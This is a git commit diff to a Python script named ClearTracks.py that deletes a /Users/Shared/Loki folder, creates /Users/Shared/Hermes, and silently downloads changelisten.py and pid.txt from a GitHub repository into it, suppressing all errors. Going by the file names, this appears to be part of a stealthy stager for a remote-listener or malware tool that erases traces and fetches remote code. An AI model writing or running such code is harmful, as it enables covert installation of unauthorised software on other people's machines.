67ac1a18ea3070ae0fc11a11af078196a0467e8a
3-TA <77489816+3-TA@users.noreply.github.com>
2023-05-18 17:41:03 +0800

    Update ClearTracks.py

--- ClearTracks.py
+++ ClearTracks.py
@@ -3,5 +3,11 @@ import os
 shutil.rmtree ('/Users/Shared/Loki')
 try:
   os.mkdir ('/Users/Shared/Hermes')
+  import time
+  time.sleep (0.5)
+  import urllib
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py")
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt")
+  time.sleep (1)
 except:
   pass
